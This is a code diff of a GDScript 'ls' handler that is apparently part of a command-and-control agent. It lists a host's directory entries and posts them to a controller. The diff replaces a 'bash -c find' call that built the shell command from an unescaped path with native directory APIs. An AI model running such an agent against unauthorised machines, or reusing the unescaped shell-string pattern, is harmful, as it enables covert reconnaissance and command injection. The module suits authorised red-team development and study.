@@ -2,48 +2,101 @@ extends Node
 
 var api
 
-const outputFormat = '{\\"is_file\\": %s, \\"permissions\\": {\\"octal\\": \\"%%m\\", \\"gid\\":\\"%%G\\", \\"inode\\":\\"%%i\\", \\"uid\\":\\"%%U\\", \\"selinux\\":\\"%%Z\\", \\"fstype\\":\\"%%F\\"}, \\"name\\": \\"%%f\\", \\"access_time\\": \\"%%AFT%%AH:%%AM:%%AS%%Az\\", \\"modify_time\\": \\"%%AFT%%AH:%%AM:%%AS%%Az\\", \\"size\\": %%s, \\"parent\\": \\"%%h\\"}\\n'
-
 func _ready():
 	api = $".".get_parent().get_node("api")
 
 
 func _on_tasking_ls(task):
-
+	
 	if task.has("command") and task.get("command") == "ls":
 		var test_json_conv = JSON.new()
 		test_json_conv.parse(task.get("parameters"))
 		var parameters = test_json_conv.get_data()
-		var path = parameters.get("path")
-		var output = "Unable to obtain listing for: %s" % path
+		var path = parameters.get("path").replace("\\", "/") # windows supports forward slashes since XP, FFS folks - use it...
+		var output = "Unable to obtain listing for: %s" % [path]
 		var status = "error"
+		var success = false
+		var is_file = true
+		var pathname = path
+		var parent_path = ""
 
 		var ret = []
-		var sep = "/"
+		
+		var dir = DirAccess.open(path)
+		
+		if dir:
+			is_file = false
+			success = true
 
-		if OS.has_feature("X11"):
-			ret = get_linux_ls(path)
+			var full_path = dir.get_current_dir(true)
+
+			parent_path = full_path.split("/")
+
+			if full_path.ends_with("/"):
+				# remove trailing slash
+				if parent_path.size() > 1:
+					parent_path.remove_at(parent_path.size()-1)
 			
-		if OS.has_feature("Windows"):
-			ret = get_windows_ls(path)
+			if parent_path.size() > 1:
+				# remove trailing path
+				var idx = parent_path.size()
+				pathname = parent_path[idx-1]
+				parent_path.remove_at(idx-1)
 
-			if path.find("/") >= 0:
-				sep = "/"
-			else:
-				sep = "\\"
+			parent_path = "/".join(parent_path)
+			
+			if parent_path == "":
+				parent_path = "/"
 
-		if OS.has_feature("OSX"):
-			ret = get_osx_ls(path)
+			if pathname == "":
+				pathname = "/"
 
-		if OS.has_feature("iOS"):
-			ret = get_ios_ls(path)
+			dir.set_include_hidden(true)
+			dir.set_include_navigational(true)
+			dir.list_dir_begin()
 
-		if OS.has_feature("Android"):
-			ret = get_android_ls(path)
+			var file_name = dir.get_next()
+			full_path = dir.get_current_dir(true)
 
-		if ret["items"].size() > 0:
-			status = "success"
-			output = "Listing of %s retrieved!" % path
+			while file_name != "":
+				var entry_path = "user://%s/%s" % [full_path, file_name]
+				var entry = {
+					"is_file": false,
+					"permissions": {"read": true},
+					"name": file_name,
+					"access_time": 0,
+					"modify_time": FileAccess.get_modified_time(entry_path),
+					"size": 0,
+				}
+				
+				if typeof(entry["modify_time"]) == TYPE_STRING:
+					entry["modify_time"] = 0
+				else:
+					entry["modify_time"] = entry["modify_time"]*1000
+
+				if dir.current_is_dir():
+					var dir_access = DirAccess.open(entry_path)
+
+					if not dir_access:
+						entry["permissions"] = {"read": false}
+				else:
+					entry["is_file"] = true
+
+					var file_access = FileAccess.open(entry_path, FileAccess.READ)
+
+					if file_access == null:
+						entry["permissions"] = {"read": false}
+					else:
+						entry["size"] = file_access.get_length()
+						file_access.close()
+
+				ret.append(entry)
+				file_name = dir.get_next()
+
+			dir.list_dir_end()
+			output = "Listing for: %s" % [path]
+
+		status = "success"
 
 		var ls_response = {
 			"task_id": task.get("id"),
@@ -51,92 +104,22 @@ func _on_tasking_ls(task):
 			"status": status,
 			"completed": true,
 			"file_browser": {
+				"is_file": is_file,
+				"name": pathname.simplify_path(),
+				"parent_path": parent_path.simplify_path(),
 				"update_deleted": true,
-				"success": false,
-				"files": []
+				"success": success,
+				"files": ret
 			}
 		}
-
-		if ret["items"].size() >= 1:
-			path = path.rstrip(sep)
-
-			if path == "":
-				path = sep
-
-			ls_response["file_browser"]["is_file"] = ret["is_file"]
-			ls_response["file_browser"]["permissions"] = ret["tle"].get("permissions")
-			ls_response["file_browser"]["name"] = ret["tle"].get("name")
-			ls_response["file_browser"]["parent_path"] = path.get_base_dir()
-			ls_response["file_browser"]["success"] = true
-			ls_response["file_browser"]["access_time"] = ret["tle"].get("access_time")
-			ls_response["file_browser"]["modify_time"] = ret["tle"].get("modify_time")
-			ls_response["file_browser"]["size"] = ret["tle"].get("size")
-
-		if ret["items"].size() > 1:
-			ls_response["file_browser"]["files"] = ret["items"]
 
 		print("\n\n")
 		print(ls_response)
 		print("\n\n")
 
-		api.agent_response(
+		api.send_agent_response(
 			JSON.stringify({
 				"action": "post_response",
 				"responses": [ls_response],
 			})
 		)
-	else:
-		pass
-		# TODO: error state
-
-func get_linux_ls_find_result(command):
-	var result = []
-	var output = []
-
-	if 0 == OS.execute("bash", ["-c", command], output, true, false):
-
-		for fileline in output[0].split('\n'):
-			if fileline.length() > 0:
-				var test_json_conv = JSON.new()
-				test_json_conv.parse(fileline)
-				var entry = test_json_conv.get_data()
-
-				if typeof(entry) == TYPE_DICTIONARY:
-					result.append(entry)
-
-	return result
-
-func get_linux_ls(path):
-	var is_file = DirAccess.dir_exists_absolute(path)
-	var result = []
-	var tle = false
-
-	# TODO: update to a single call?
-	# 	$ find / \
-	#   	\( -type f -printf "formats" \) , \
-	#       \( -type d -printf "formats" \)
-
-	var directories = get_linux_ls_find_result("find %s %s %s %s %s %s %s %s" % [path, "-maxdepth", "1", "-type", "d", "-printf", "'%s'" % [outputFormat % "false"], "2>/dev/null"])
-	var files = get_linux_ls_find_result("find %s %s %s %s %s %s %s %s" % [path, "-maxdepth", "1", "-type", "f", "-printf", "'%s'" % [outputFormat % "true"], "2>/dev/null"])
-
-	if is_file:
-		tle = files.pop_front()
-	else:
-		tle = directories.pop_front()
-
-	result.append_array(directories)
-	result.append_array(files)
-
-	return {"is_file": is_file, "tle": tle, "items": result}
-
-func get_windows_ls(_path):
-	return []
-
-func get_osx_ls(_path):
-	return []
-
-func get_ios_ls(_path):
-	return []
-
-func get_android_ls(_path):
-	return []
